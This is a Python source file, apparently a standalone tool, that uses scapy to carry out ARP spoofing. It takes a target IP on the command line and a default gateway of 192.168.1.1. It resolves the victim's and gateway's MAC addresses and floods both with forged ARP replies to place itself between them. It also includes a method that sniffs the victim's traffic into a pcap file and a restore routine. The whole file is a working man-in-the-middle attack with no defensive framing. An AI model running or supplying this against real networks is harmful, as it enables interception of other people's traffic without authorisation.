import sys
import time
import threading
from scapy.all import (Ether,ARP,srp,send,wrpcap,sniff)

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op='who-has',pdst=ip)
    resp,_ = srp(packet,timeout=2,retry=10,verbose=False)
    for _,r in resp:
        return r[Ether].src
    return None

class Venom:
    def __init__(self,target,gateway,count=None,iface='eth0'):
        self.count = count
        self.victim = target
        self.victimmac=get_mac(target)
        self.gateway=gateway
        self.gatewaymac=get_mac(gateway)
        self.pcount = count
        self.iface = iface
         
    def poison(self):

        victim = ARP()
        victim.pdst = self.victim
        victim.hwdst = self.victimmac
        victim.psrc = self.gateway
        victim.op = 2
        print(f"Victim packet destination : {victim.pdst}")
        print(f"Victim packet hardware destination : {victim.hwdst}")
        print(f"Victim packet source : {victim.psrc}")
        print(f"Victim packet hardware source : {victim.hwsrc}")
        print(f"packet summary:\n{victim.summary()}")

        gateway = ARP()
        gateway.pdst = self.gateway
        gateway.hwdst = self.gatewaymac
        gateway.psrc = self.victim
        gateway.op = 2
        print(f"Gateway packet destination : {gateway.pdst}")
        print(f"Gateway packet hardware destination : {gateway.hwdst}")
        print(f"Gateway packet source : {gateway.psrc}")
        print(f"Gateway packet hardware source : {gateway.hwsrc}")
        print(f"packet summary:\n{gateway.summary()}")

        try:
            while True:
                if get_mac(self.victim) is None:
                    continue
                send(victim)
                send(gateway)
        except KeyboardInterrupt:
            print("Keyboard Interrupt")
            self.restore()
            sys.exit(1)

        finally:
            self.restore()
        
                    

    def sniff(self):
        
        time.sleep(5)
        filter = f"ip host {self.victim}"
        try:
            if not self.count is None:
                packets = sniff(iface=self.iface,filter=filter,count=self.count)
            else:
                packets = sniff(iface=self.iface,filter=filter)
                
        except KeyboardInterrupt:
            wrpcap("arp_out.pcap",packets)
            print("[+] Got the packets")
            self.arp_poison.terminate()
            self.restore()
            print("Finished")
        wrpcap("arp_out.pcap",packets)
        print("[+] Got the packets")
        self.arp_poison.terminate()
        self.restore()
        print("Finished")
    
    def run(self):
        self.arp_poison = threading.Thread(target=self.poison)
        self.arp_poison.start()

        #self.sniffer = threading.Thread(target=self.sniff)
        #self.sniffer.start()
        
    def restore(self):
    
        victim = ARP()
        victim.pdst = self.gateway
        victim.hwdst = self.gatewaymac
        victim.psrc = self.victim
        victim.hwsrc=self.victimmac
        victim.op = 2

        gateway = ARP()
        gateway.pdst = self.victim
        gateway.hwdst = self.victimmac
        gateway.psrc = self.gateway
        gateway.hwsrc = self.gatewaymac
        gateway.op = 2
        
        send(victim)
        send(gateway)

if __name__ == '__main__':
    gateway = '192.168.1.1'
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        print(f"Usage {sys.argv[0]} <target to poison> [gateway]")        
        sys.exit(1)
        
    if len(sys.argv) == 3:
        gateway = sys.argv[2]

    arp_venom = Venom(target,gateway,count=200)
    arp_venom.run()
